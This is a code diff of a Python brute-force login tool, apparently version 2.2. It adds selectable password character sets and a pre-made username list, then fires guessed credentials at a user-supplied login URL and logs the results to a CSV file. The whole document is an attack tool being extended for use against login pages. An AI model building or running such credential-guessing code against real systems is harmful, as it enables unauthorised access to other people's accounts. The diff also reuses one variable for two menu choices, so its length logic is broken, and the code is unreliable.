@@ -1,5 +1,5 @@
 import csv
-import getpass  # Import the getpass module
+import getpass
 import random
 import string
 import time
@@ -10,8 +10,15 @@ def generate_username():
     return ''.join(random.choices(string.ascii_lowercase, k=5))
 
 # Function to generate a random password
-def generate_password(length):
-    characters = string.ascii_letters + string.digits + string.punctuation
+def generate_password(length, use_letters=True, use_numbers=True, use_symbols=True):
+    characters = ''
+    if use_letters:
+        characters += string.ascii_letters
+    if use_numbers:
+        characters += string.digits
+    if use_symbols:
+        characters += string.punctuation
+
     return ''.join(random.choice(characters) for _ in range(length))
 
 # Function to simulate a login attempt using a POST request
@@ -66,7 +73,7 @@ BBBBBBBBBBBBBBBBB   RRRRRRRR     RRRRRRR      UUUUUUUUU            TTTTTTTTTTT  
 ''' + "\033[0m")
 
 # Print version in blue
-print("\033[94mVersion 2.1\033[0m")
+print("\033[94mVersion 2.2\033[0m")
 
 # Print greeting and quote in green
 quotes = [
@@ -99,6 +106,26 @@ login_url = input("\033[92mEnter the login URL: \033[0m")
 # Prompt the user to enter the number of overall attempts
 num_attempts = int(input("\033[92mEnter the number of overall attempts: \033[0m"))
 
+# Prompt the user to choose a password character type
+print("\033[92mChoose a password character type:")
+print("1. Letters only")
+print("2. Numbers only")
+print("3. Symbols only")
+print("4. Letters, Numbers, and Symbols (default)")
+option = int(input("Enter 1, 2, 3, or 4: \033[0m"))
+
+# Handle the chosen option
+use_letters = True
+use_numbers = True
+use_symbols = True
+
+if option == 1:
+    use_numbers = use_symbols = False
+elif option == 2:
+    use_letters = use_symbols = False
+elif option == 3:
+    use_letters = use_numbers = False
+
 # Prompt the user to choose a password length option
 print("\033[92mChoose a password length option:")
 print("1. Set a fixed password length")
@@ -115,6 +142,19 @@ else:
 # Prompt the user to enter the delay between attempts
 delay_between_attempts = int(input("\033[92mEnter the delay between attempts (in milliseconds, 10 to 10000): \033[0m"))
 
+# Prompt the user to specify a file with pre-made usernames
+use_usernames_file = input("\033[92mDo you want to use a file with pre-made usernames? (y/n): \033[0m").lower()
+
+premade_usernames = []
+
+if use_usernames_file == 'y':
+    usernames_file_path = input("\033[92mEnter the path to the file with pre-made usernames: \033[0m")
+    try:
+        with open(usernames_file_path, 'r') as usernames_file:
+            premade_usernames = [line.strip() for line in usernames_file if line.strip()]
+    except FileNotFoundError:
+        print("\033[91mError: File not found. Using random usernames instead.\033[0m")
+
 # Display countdown
 print("\033[92mStarting the brute force attack in 10 seconds...\033[0m")
 for i in range(10, 0, -1):
@@ -129,12 +169,15 @@ with open('PASSWORDS.csv', 'w', newline='') as csvfile:
     writer.writeheader()
 
     for attempt_num in range(1, num_attempts + 1):
-        username = generate_username()
+        if premade_usernames:
+            username = random.choice(premade_usernames)
+        else:
+            username = generate_username()
         if option == 1:
-            password = generate_password(password_length)
+            password = generate_password(password_length, use_letters, use_numbers, use_symbols)
         else:
             password_length = random.randint(min_length, max_length)
-            password = generate_password(password_length)
+            password = generate_password(password_length, use_letters, use_numbers, use_symbols)
         result = attempt_login(username, password, login_url)
         
         # Visual broadcast of the attempt
